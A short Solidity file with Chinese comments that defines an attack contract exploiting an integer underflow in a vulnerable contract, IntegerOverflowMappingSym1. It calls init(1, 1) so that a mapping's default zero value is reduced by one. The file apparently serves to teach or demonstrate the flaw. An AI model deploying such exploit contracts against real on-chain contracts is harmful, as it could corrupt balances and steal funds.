// 以下為攻擊程式碼，攻擊者利用預設為 0 的 mapping 值，傳入大於 0 的 v 使得 underflow 發生

contract AttackIntegerUnderflow {
    // 連結到有漏洞的合約
    IntegerOverflowMappingSym1 public vulnerable;

    // 建構子中輸入漏洞合約的位址
    constructor(address _vulnerableAddr) public {
        vulnerable = IntegerOverflowMappingSym1(_vulnerableAddr);
    }

    // 進行攻擊，利用 mapping 預設值 0 減去 1 導致 underflow
    function attack() public {
        // 傳入 key 為 1, 且 v 為 1
        vulnerable.init(1, 1);
    }
}

// 此處為漏洞合約介面定義，以便編譯通過
interface IntegerOverflowMappingSym1 {
    function init(uint256 k, uint256 v) external;
}
